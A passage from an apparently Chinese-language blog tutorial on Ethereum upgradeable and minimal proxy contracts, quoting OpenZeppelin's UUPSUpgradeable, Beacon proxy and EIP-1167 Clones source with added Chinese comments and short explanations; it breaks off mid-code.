+<h5 id="OpenZeppelin-中的应用"><a href="#OpenZeppelin-中的应用" class="headerlink" title="OpenZeppelin 中的应用"></a>OpenZeppelin 中的应用</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts (last updated v4.5.0) (proxy/utils/UUPSUpgradeable.sol)<br><br>pragma solidity ^0.8.0;<br><br>import &quot;../../interfaces/draft-IERC1822.sol&quot;;<br>import &quot;../ERC1967/ERC1967Upgrade.sol&quot;;<br><br>/**<br> * @dev An upgradeability mechanism designed for UUPS proxies. The functions included here can perform an upgrade of an<br> * &#123;ERC1967Proxy&#125;, when this contract is set as the implementation behind such a proxy.<br> *<br> * A security mechanism ensures that an upgrade does not turn off upgradeability accidentally, although this risk is<br> * reinstated if the upgrade retains upgradeability but removes the security mechanism, e.g. by replacing<br> * `UUPSUpgradeable` with a custom implementation of upgrades.<br> *<br> * The &#123;_authorizeUpgrade&#125; function must be overridden to include access restriction to the upgrade mechanism.<br> *<br> * _Available since v4.1._<br> */<br>abstract contract UUPSUpgradeable is IERC1822Proxiable, ERC1967Upgrade &#123;<br>    /// @custom:oz-upgrades-unsafe-allow state-variable-immutable state-variable-assignment<br>    address private immutable __self = address(this);<br><br>    /**<br>     * @dev Check that the execution is being performed through a delegatecall call and that the execution context is<br>     * a proxy contract with an implementation (as defined in ERC1967) pointing to self. This should only be the case<br>     * for UUPS and transparent proxies that are using the current contract as their implementation. Execution of a<br>     * function through ERC1167 minimal proxies (clones) would not normally pass this test, but is not guaranteed to<br>     * fail.<br>     */<br>    // 检查执行是否通过委托调用执行，并且执行上下文是一个代理合约，其实现（如 ERC1967 中定义）指向 self. 这应该只适用于使用当前合同作为其实现的 UUPS 和透明代理。通过 ERC1167 最小代理（克隆）执行函数通常不会通过此测试，但不能保证会失败。<br>    modifier onlyProxy() &#123;<br>        require(address(this) != __self, &quot;Function must be called through delegatecall&quot;);<br>        require(_getImplementation() == __self, &quot;Function must be called through active proxy&quot;);<br>        _;<br>    &#125;<br><br>    /**<br>     * @dev Check that the execution is not being performed through a delegate call. This allows a function to be<br>     * callable on the implementing contract but not through proxies.<br>     */<br>    // 检查执行是否不是通过委托调用执行的。这允许函数可以在执行合约上调用，但不能通过代理调用。<br>    modifier notDelegated() &#123;<br>        require(address(this) == __self, &quot;UUPSUpgradeable: must not be called through delegatecall&quot;);<br>        _;<br>    &#125;<br><br>    /**<br>     * @dev Implementation of the ERC1822 &#123;proxiableUUID&#125; function. This returns the storage slot used by the<br>     * implementation. It is used to validate the implementation&#x27;s compatibility when performing an upgrade.<br>     *<br>     * IMPORTANT: A proxy pointing at a proxiable contract should not be considered proxiable itself, because this risks<br>     * bricking a proxy that upgrades to it, by delegating to itself until out of gas. Thus it is critical that this<br>     * function revert if invoked through a proxy. This is guaranteed by the `notDelegated` modifier.<br>     */<br>    // ERC1822proxiableUUID功能的实现。这将返回实现使用的存储槽。它用于验证此实现在升级后是否仍然有效。<br>    // 指向可代理合约的代理本身不应该被认为是可代理的，因为这可能会通过委托给自己直到耗尽gas而破坏升级到它的代理。因此，如果通过代理调用此函数，则该函数恢复至关重要。这是由notDelegated修饰符保证的。<br>    function proxiableUUID() external view virtual override notDelegated returns (bytes32) &#123;<br>        return _IMPLEMENTATION_SLOT;<br>    &#125;<br><br>    /**<br>     * @dev Upgrade the implementation of the proxy to `newImplementation`.<br>     *<br>     * Calls &#123;_authorizeUpgrade&#125;.<br>     *<br>     * Emits an &#123;Upgraded&#125; event.<br>     */<br>    // 将代理的实施升级到newImplementation.<br>    function upgradeTo(address newImplementation) external virtual onlyProxy &#123;<br>        _authorizeUpgrade(newImplementation);<br>        _upgradeToAndCallUUPS(newImplementation, new bytes(0), false);<br>    &#125;<br><br>    /**<br>     * @dev Upgrade the implementation of the proxy to `newImplementation`, and subsequently execute the function call<br>     * encoded in `data`.<br>     *<br>     * Calls &#123;_authorizeUpgrade&#125;.<br>     *<br>     * Emits an &#123;Upgraded&#125; event.<br>     */<br>    // 将代理的实现升级到newImplementation，然后执行编码在 中的函数调用data。<br>    function upgradeToAndCall(address newImplementation, bytes memory data) external payable virtual onlyProxy &#123;<br>        _authorizeUpgrade(newImplementation);<br>        _upgradeToAndCallUUPS(newImplementation, data, true);<br>    &#125;<br><br>    /**<br>     * @dev Function that should revert when `msg.sender` is not authorized to upgrade the contract. Called by<br>     * &#123;upgradeTo&#125; and &#123;upgradeToAndCall&#125;.<br>     *<br>     * Normally, this function will use an xref:access.adoc[access control] modifier such as &#123;Ownable-onlyOwner&#125;.<br>     *<br>     * ```solidity<br>     * function _authorizeUpgrade(address) internal override onlyOwner &#123;&#125;<br>     * ```<br>     */<br>    // 当 `msg.sender` 无权升级合约时应该revert的功能。<br>    function _authorizeUpgrade(address newImplementation) internal virtual;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>Openzeppelin中关于EIP-1822的实现与EIP-1822中的定义并不一致，主要是EIP-1822中定义的插槽位置与EIP-1967中定义的插槽位置不一致导致。openzeppelin选择使用EIP-1967中定义的插槽位置来具体实现。同时EIP-1822也有很明显的缺点，即新来的一个实现合约中只实现了proxiableUUID方法，没有实现updateCodeAddress方法，则合约就无法继续升级，导致所有的代理合约都锁死。</p>
+<p>故openzepplin在具体实现时，其实现的具体思路为：提供一个UUPSUpgradeable合约，在该合约中提供合约升级方法：upgradeTo. 与EIP-1822的不同点在于，它取消了proxiableUUID这个flag，增加了_autorizeUpgrade方法，用于授权一个新地址。同时提供了一个upgradeToAndCall方法，用于升级后马上进行初始化操作。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upgradeTo</span>(<span class="hljs-params">address newImplementation</span>) <span class="hljs-title">external</span> <span class="hljs-title">virtual</span> </span>&#123;<br>    <span class="hljs-comment">//第一步检查msg.sender的权限</span><br>    _authorizeUpgrade(newInplementation);<br>    <span class="hljs-comment">//第二步执行升级步骤</span><br>    _upgradeToAndCallSecure(newImplementaion,<span class="hljs-keyword">new</span> bytes(<span class="hljs-number">0</span>),<span class="hljs-literal">false</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upgradeToAndCall</span>(<span class="hljs-params">address newImplementation, bytes memory data</span>) <span class="hljs-title">external</span> <span class="hljs-title">payable</span> <span class="hljs-title">virtual</span> </span>&#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_authorizeUpgrade</span>(<span class="hljs-params">address newImplementation</span>) <span class="hljs-title">internal</span> <span class="hljs-title">onlyOwner</span>(<span class="hljs-params"></span>) </span>&#123;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>其中，openzeppelin通过回滚检测，来检查是否升级成功，避免了EIP-1822中遇到的问题：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function _upgradeToAndCallSecure(address newImplementation,bytes memory data,bool forceCall) internal &#123;<br>    //第一步：设置newImpl地址到实现合约地址<br>    address oldImplementation = _getImplementation();<br>    _setImplementation(newImplementation);<br>    //第二步：针对新的实现合约地址进行初始化<br>    if (data.length &gt; 0 || forceCall) &#123;<br>        Address.delegateCall(newImplementation, data);<br>    &#125;<br>    //第三步：执行回滚检查<br>    // Perform rollback test if not already in progress<br>    StorageSlot.BooleanSlot storage rollbackTesting = StorageSlot.getBooleanSlot(_ROLLBACK_SLOT);<br>    //第四步：首先假设触发回滚操作，由新地址重新回滚到旧地址上，再检查升级后的旧地址是否是之前的旧地址，如果是，则说明回滚成功。如果可以回滚成功，说明升级到该新地址是安全的。<br>    if (!rollbackTesting.value) &#123;<br>        //需要执行回滚操作<br>        //即将impl地址由新地址改回旧地址，通过调用新地址上的upgradeTo方法来进行<br>        rollbackTesting.value = true;<br>        Address.functionDelegateCall(newInplementation, abi.encodeWithSigature(&quot;upgradeTo(address)&quot;,oldImplementation));<br>        rollbackTesting.value = false;<br>        //检查回滚是否成功<br>        require(oldImplementation == _getImplementation());<br>        //最后设置回新地址，并打log Upgraded(address)<br>        _upgradeTo(newImplementation);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="Beacon"><a href="#Beacon" class="headerlink" title="Beacon"></a>Beacon</h4><p><a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/proxy/beacon">beacon 代码</a></p>
+<p>以上两种代理，都存在一种缺陷，就是如果我要升级一批具有相同逻辑合约的代理合约，那么需要在每个代理合约都执行一遍升级（因为每个代理合约独立存储了 <code>_implementation</code>）。信标合约，就是将所有的具有相同逻辑合约的代理合约的 <code>_implementation</code> 只存一份在信标合约中，所有的代理合约通过和信标合约接口调用，获取 <code>_implementation</code>，这样，在升级的时候，就可以只升级信标合约，就能搞定所有的代理合约的升级。</p>
+<p><img src="/2022/11/13/upgradeable/image-20221104215922504.png" srcset="/img/loading.gif" lazyload alt="image-20221104215922504"></p>
+<h5 id="BeaconProxy"><a href="#BeaconProxy" class="headerlink" title="BeaconProxy"></a>BeaconProxy</h5><p>此合约实现一个代理，该代理从<a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#UpgradeableBeacon"><code>可升级信标</code></a>获取每个调用的实现地址。</p>
+<p>信标地址存储在存储插槽中， 因此它不会 与代理后面实现的存储布局冲突。<code>uint256(keccak256(&#39;eip1967.proxy.beacon&#39;)) - 1</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts (last updated v4.7.0) (proxy/beacon/BeaconProxy.sol)<br><br>pragma solidity ^0.8.0;<br><br>import &quot;./IBeacon.sol&quot;;<br>import &quot;../Proxy.sol&quot;;<br>import &quot;../ERC1967/ERC1967Upgrade.sol&quot;;<br><br>/**<br> * @dev This contract implements a proxy that gets the implementation address for each call from an &#123;UpgradeableBeacon&#125;.<br> *<br> * The beacon address is stored in storage slot `uint256(keccak256(&#x27;eip1967.proxy.beacon&#x27;)) - 1`, so that it doesn&#x27;t<br> * conflict with the storage layout of the implementation behind the proxy.<br> *<br> * _Available since v3.4._<br> */<br>contract BeaconProxy is Proxy, ERC1967Upgrade &#123;<br>    /**<br>     * @dev Initializes the proxy with `beacon`.<br>     *<br>     * If `data` is nonempty, it&#x27;s used as data in a delegate call to the implementation returned by the beacon. This<br>     * will typically be an encoded function call, and allows initializing the storage of the proxy like a Solidity<br>     * constructor.<br>     *<br>     * Requirements:<br>     *<br>     * - `beacon` must be a contract with the interface &#123;IBeacon&#125;.<br>     */<br>    // 初始化 beacon 代理<br>    // 如果 `data` 不为空，它会在对信标返回的实现的委托调用中用作数据。 这通常是一个编码的函数调用，并允许像 Solidity 构造函数一样初始化代理的存储<br>    constructor(address beacon, bytes memory data) payable &#123;<br>        _upgradeBeaconToAndCall(beacon, data, false);<br>    &#125;<br><br>    /**<br>     * @dev Returns the current beacon address.<br>     */<br>    // 返回当前信标地址<br>    function _beacon() internal view virtual returns (address) &#123;<br>        return _getBeacon();<br>    &#125;<br><br>    /**<br>     * @dev Returns the current implementation address of the associated beacon.<br>     */<br>    //  返回关联信标的当前逻辑合约地址<br>    function _implementation() internal view virtual override returns (address) &#123;<br>        return IBeacon(_getBeacon()).implementation();<br>    &#125;<br><br>    /**<br>     * @dev Changes the proxy to use a new beacon. Deprecated: see &#123;_upgradeBeaconToAndCall&#125;.<br>     *<br>     * If `data` is nonempty, it&#x27;s used as data in a delegate call to the implementation returned by the beacon.<br>     *<br>     * Requirements:<br>     *<br>     * - `beacon` must be a contract.<br>     * - The implementation returned by `beacon` must be a contract.<br>     */<br>    // 更改代理以使用新信标。已弃用，参阅 _upgradeBeaconToAndCall<br>    function _setBeacon(address beacon, bytes memory data) internal virtual &#123;<br>        _upgradeBeaconToAndCall(beacon, data, false);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<h5 id="IBeacon"><a href="#IBeacon" class="headerlink" title="IBeacon"></a>IBeacon</h5><p>接口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts v4.4.1 (proxy/beacon/IBeacon.sol)<br><br>pragma solidity ^0.8.0;<br><br>/**<br> * @dev This is the interface that &#123;BeaconProxy&#125; expects of its beacon.<br> */<br>interface IBeacon &#123;<br>    /**<br>     * @dev Must return an address that can be used as a delegate call target.<br>     *<br>     * &#123;BeaconProxy&#125; will check that this address is a contract.<br>     */<br>    // 必须返回可用作委托调用目标的地址。<br>    function implementation() external view returns (address);<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<h5 id="UpgradeableBeacon"><a href="#UpgradeableBeacon" class="headerlink" title="UpgradeableBeacon"></a>UpgradeableBeacon</h5><p>本合约与一个或多个<a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#BeaconProxy"><code>信标代理</code></a>实例结合使用，以确定其 实现协定，这是他们将委派所有函数调用的地方。</p>
+<p>所有者能够更改信标指向的实现， 从而升级使用此信标的代理.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts v4.4.1 (proxy/beacon/UpgradeableBeacon.sol)<br><br>pragma solidity ^0.8.0;<br><br>import &quot;./IBeacon.sol&quot;;<br>import &quot;../../access/Ownable.sol&quot;;<br>import &quot;../../utils/Address.sol&quot;;<br><br>/**<br> * @dev This contract is used in conjunction with one or more instances of &#123;BeaconProxy&#125; to determine their<br> * implementation contract, which is where they will delegate all function calls.<br> *<br> * An owner is able to change the implementation the beacon points to, thus upgrading the proxies that use this beacon.<br> */<br>contract UpgradeableBeacon is IBeacon, Ownable &#123;<br>    address private _implementation;<br><br>    /**<br>     * @dev Emitted when the implementation returned by the beacon is changed.<br>     */<br>    event Upgraded(address indexed implementation);<br><br>    /**<br>     * @dev Sets the address of the initial implementation, and the deployer account as the owner who can upgrade the<br>     * beacon.<br>     */<br>    // 设置初始实现的地址，部署者帐户为可以升级信标的所有者。<br>    constructor(address implementation_) &#123;<br>        _setImplementation(implementation_);<br>    &#125;<br><br>    /**<br>     * @dev Returns the current implementation address.<br>     */<br>    // 返回当前逻辑合约地址<br>    function implementation() public view virtual override returns (address) &#123;<br>        return _implementation;<br>    &#125;<br><br>    /**<br>     * @dev Upgrades the beacon to a new implementation.<br>     *<br>     * Emits an &#123;Upgraded&#125; event.<br>     *<br>     * Requirements:<br>     *<br>     * - msg.sender must be the owner of the contract.<br>     * - `newImplementation` must be a contract.<br>     */<br>    // 升级信标<br>    // 要求：msg.sender必须是合同的所有者。newImplementation必须是合同。<br>    function upgradeTo(address newImplementation) public virtual onlyOwner &#123;<br>        _setImplementation(newImplementation);<br>        emit Upgraded(newImplementation);<br>    &#125;<br><br>    /**<br>     * @dev Sets the implementation contract address for this beacon<br>     *<br>     * Requirements:<br>     *<br>     * - `newImplementation` must be a contract.<br>     */<br>    // 设置此信标的实现合约地址<br>    function _setImplementation(address newImplementation) private &#123;<br>        require(Address.isContract(newImplementation), &quot;UpgradeableBeacon: implementation is not a contract&quot;);<br>        _implementation = newImplementation;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="EIP1167"><a href="#EIP1167" class="headerlink" title="EIP1167"></a>EIP1167</h3><h4 id="最小代理合约"><a href="#最小代理合约" class="headerlink" title="最小代理合约"></a>最小代理合约</h4><p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=7H7GVI1gsTc">https://www.youtube.com/watch?v=7H7GVI1gsTc</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.openzeppelin.com/deep-dive-into-the-minimal-proxy-contract/">https://blog.openzeppelin.com/deep-dive-into-the-minimal-proxy-contract/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1167.md">EIP1167官方文档</a></p>
+<p>不要混淆可升级代理和最小代理，这是非常重要的，它们是完全不同的。</p>
+<h4 id="要解决的问题"><a href="#要解决的问题" class="headerlink" title="要解决的问题"></a>要解决的问题</h4><p>避免重复部署同样的合约代码，取而代之的是只部署一次合约代码，当需要一份拷贝的时候，就只需要部署一个简单的代理合约。代理合约使用<code>delegatecall</code>来调用合约代码，代理合约有自己的地址、存储插槽和以太余额等。主要目的是为了节约Gas。</p>
+<p>EIP-1167标准是为了以不可改变的方式简单而廉价地克隆目标合约的功能，它规定了一个最小的字节码实现，它将所有调用委托给一个已知的固定地址。</p>
+<p><img src="/2022/11/13/upgradeable/erc-1167.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>为了实施这个标准，我们需要：</p>
+<ul>
+<li>执行合约：有时被称为基础合约、核心合约、主合约等。重要的是，执行合约是所有逻辑所在的地方。</li>
+<li>代理工厂或克隆工厂：顾名思义，克隆工厂合约将是我们的工厂。这意味着用户将调用工厂的一个函数，而工厂将克隆一份实施合同的精确副本，但拥有自己的存储空间。这意味着每个克隆都有相同的逻辑，但存储状态独立。</li>
+<li>代理：如前所述，代理合约是实施合约的克隆，但具有独特的存储。</li>
+</ul>
+<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>EIP1167 所做的事情可以概括如下，它只是把这个步骤翻译成了字节码形式</p>
+<ol>
+<li>接收请求数据</li>
+<li>将请求数据通过 <a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://github.com/ethereum/EIPs/blob/master/EIPS/eip-7.md">DELEGATECALL</a> 指令传递给目标实现合约。</li>
+<li>得到合约调用的返回数据</li>
+<li>将结果返回给调用者或者将交易回滚</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts (last updated v4.7.0) (proxy/Clones.sol)<br><br>pragma solidity ^0.8.0;<br><br>/**<br> * @dev https://eips.ethereum.org/EIPS/eip-1167[EIP 1167] is a standard for<br> * deploying minimal proxy contracts, also known as &quot;clones&quot;.<br> *<br> * &gt; To simply and cheaply clone contract functionality in an immutable way, this standard specifies<br> * &gt; a minimal bytecode implementation that delegates all calls to a known, fixed address.<br> *<br> * The library includes functions to deploy a proxy using either `create` (traditional deployment) or `create2`<br> * (salted deterministic deployment). It also includes functions to predict the addresses of clones deployed using the<br> * deterministic method.<br> *<br> * _Available since v3.4._<br> */<br>library Clones &#123;<br>    /**<br>     * @dev Deploys and returns the address of a clone that mimics the behaviour of `implementation`.<br>     *<br>     * This function uses the create opcode, which should never revert.<br>     */<br>    // 部署并返回模仿其行为的克隆的地址 implementation。此函数使用创建操作码，该操作码不应还原。<br>    function clone(address implementation) internal returns (address instance) &#123;<br>        /// @solidity memory-safe-assembly<br>        assembly &#123;<br>            // Cleans the upper 96 bits of the `implementation` word, then packs the first 3 bytes<br>            // of the `implementation` address with the bytecode before the address.<br>            mstore(0x00, or(shr(0xe8, shl(0x60, implementation)), 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000))<br>            // Packs the remaining 17 bytes of `implementation` with the bytecode after the address.<br>            mstore(0x20, or(shl(0x78, implementation), 0x5af43d82803e903d91602b57fd5bf3))<br>            instance := create(0, 0x09, 0x37)<br>        &#125;<br>        require(instance != address(0), &quot;ERC1167: create failed&quot;);<br>    &#125;<br><br>    /**<br>     * @dev Deploys and returns the address of a clone that mimics the behaviour of `implementation`.<br>     *<br>     * This function uses the create2 opcode and a `salt` to deterministically deploy<br>     * the clone. Using the same `implementation` and `salt` multiple time will revert, since<br>     * the clones cannot be deployed twice at the same address.<br>     */<br>    // 部署并返回模仿“实现”行为的克隆的地址。<br>    // 此函数使用 create2 操作码和 `salt` 来确定性地部署克隆。 多次使用相同的 `implementation` 和 `salt` 将 revert，因为克隆不能在同一地址部署两次。<br>    function cloneDeterministic(address implementation, bytes32 salt) internal returns (address instance) &#123;<br>        /// @solidity memory-safe-assembly<br>        assembly &#123;<br>            // Cleans the upper 96 bits of the `implementation` word, then packs the first 3 bytes<br>            // of the `implementation` address with the bytecode before the address.<br>            mstore(0x00, or(shr(0xe8, shl(0x60, implementation)), 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000))<br>            // Packs the remaining 17 bytes of `implementation` with the bytecode after the address.<br>            mstore(0x20, or(shl(0x78, implementation), 0x5af43d82803e903d91602b57fd5bf3))<br>            instance := create2(0, 0x09, 0x37, salt)<br>        &#125;<br>        require(instance != address(0), &quot;ERC1167: create2 failed&quot;);<br>    &#125;<br><br>    /**<br>     * @dev Computes the address of a clone deployed using &#123;Clones-cloneDeterministic&#125;.<br>     */<br>    // 计算使用 &#123;Clones-cloneDeterministic&#125; 部署的克隆的地址。<br>    function predictDeterministicAddress(<br>        address implementation,<br>        bytes32 salt,<br>        address deployer<br>    ) internal pure returns (address predicted) &#123;<br>        /// @solidity memory-safe-assembly<br>        assembly &#123;<br>            let ptr := mload(0x40)<br>            